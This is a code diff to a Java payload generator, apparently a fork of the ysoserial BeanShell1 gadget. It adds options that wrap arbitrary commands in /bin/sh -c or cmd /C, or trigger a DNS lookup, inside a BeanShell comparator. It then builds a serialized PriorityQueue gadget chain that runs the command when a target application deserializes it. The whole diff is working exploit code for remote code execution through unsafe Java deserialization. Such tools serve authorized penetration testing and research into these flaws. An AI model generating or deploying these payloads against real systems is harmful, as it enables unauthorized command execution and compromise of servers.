@@ -26,37 +26,56 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
 
     public PriorityQueue getObject(String command, String attackType) throws Exception {
 	// BeanShell payload
-
-        String payload =
+    	
+    	// federicodotta - Sleep not supported
+   
+    	// default ysoserial global exec
+    	String payload =
             "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                 Strings.join( // does not support spaces in quotes
                     Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                     ",", "\"", "\"") +
                 "}).start();return new Integer(1);}";
+    	// federicodotta - EXEC with args unix	
+	    if(attackType.equals("exec_unix")) {
+	    	 
+	    	payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",\"" + command + "\"}).start();return new Integer(1);}";	    	 
 
-	// Create Interpreter
-	Interpreter i = new Interpreter();
+    	// federicodotta - EXEC with args win	    	
+	    } else if(attackType.equals("exec_win")) {
+	    	 
+	    	payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"cmd\",\"/C\",\"" + command + "\"}).start();return new Integer(1);}";
 
-	// Evaluate payload
-	i.eval(payload);
+	    // federicodotta - Java native DNS resolution			
+	    } else if(attackType.equals("dns")) {
+ 			
+	        payload = "compare(Object foo, Object bar) {java.net.InetAddress.getByName(\"" + command + "\");return new Integer(1);}";	    	
+	
+		} 
 
-	// Create InvocationHandler
-	XThis xt = new XThis(i.getNameSpace(), i);
-	InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
-
-	// Create Comparator Proxy
-	Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
-
-	// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
-	final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
-	Object[] queue = new Object[] {1,1};
-	Reflections.setFieldValue(priorityQueue, "queue", queue);
-	Reflections.setFieldValue(priorityQueue, "size", 2);
-
-	return priorityQueue;
+		// Create Interpreter
+		Interpreter i = new Interpreter();
+	
+		// Evaluate payload
+		i.eval(payload);
+	
+		// Create InvocationHandler
+		XThis xt = new XThis(i.getNameSpace(), i);
+		InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
+	
+		// Create Comparator Proxy
+		Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
+	
+		// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
+		final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
+		Object[] queue = new Object[] {1,1};
+		Reflections.setFieldValue(priorityQueue, "queue", queue);
+		Reflections.setFieldValue(priorityQueue, "size", 2);
+	
+		return priorityQueue;
     }
 
     public static void main(final String[] args) throws Exception {
-	PayloadRunner.run(BeanShell1.class, args);
+    	PayloadRunner.run(BeanShell1.class, args);
     }
 }
